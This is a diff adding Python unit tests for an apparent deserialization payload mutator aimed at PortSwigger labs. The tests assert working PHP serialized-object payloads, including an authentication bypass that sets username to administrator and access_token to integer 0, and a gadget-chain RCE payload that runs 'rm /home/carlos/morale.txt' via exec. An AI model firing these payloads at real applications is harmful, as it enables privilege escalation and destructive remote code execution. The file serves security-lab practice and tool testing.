@@ -246,5 +246,39 @@ class TestJavaRceEscalation(unittest.TestCase):
             spy_escalate.assert_called_once()
 
 
+class TestPhpTypeJuggling(unittest.TestCase):
+    """PortSwigger 'Modifying serialized data types': winning payload needs a STRING
+    field (access_token) turned into integer 0 (PHP loose-compare bypass) together with
+    username -> administrator. modify_string never changes the TYPE, so __type_juggle
+    was added."""
+
+    LAB = ('O:4:"User":2:{s:8:"username";s:6:"wiener";'
+           's:12:"access_token";s:32:"qstozslgs4qxcxatc371ib4vkp7d0fw5";}')
+
+    def test_generates_the_exact_lab_solution_payload(self):
+        payloads = decoded_payloads(mutate(self.LAB, "modify_string", "Privilege Escalation"))
+        self.assertIn(
+            'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}',
+            payloads,
+            "Combined privesc payload (username=administrator + access_token=i:0) phai duoc sinh ra",
+        )
+
+    def test_token_field_alone_juggled_to_integer_zero(self):
+        payloads = decoded_payloads(mutate(self.LAB, "modify_string", "Privilege Escalation"))
+        self.assertIn(
+            'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}',
+            payloads,
+        )
+
+    def test_no_type_juggle_on_gadget_chain_without_token_field(self):
+        # CustomTemplate RCE payload co string field nhung KHONG field token/secret nao
+        # -> type juggling khong duoc kich hoat (bien chuoi thanh 0 la vo nghia o day).
+        payload = ('O:14:"CustomTemplate":2:{s:17:"default_desc_type";'
+                   's:26:"rm /home/carlos/morale.txt";s:4:"desc";'
+                   'O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}')
+        results = mutate(payload, "modify_string")
+        self.assertFalse(any(r["type"].startswith("type_juggle") for r in results))
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
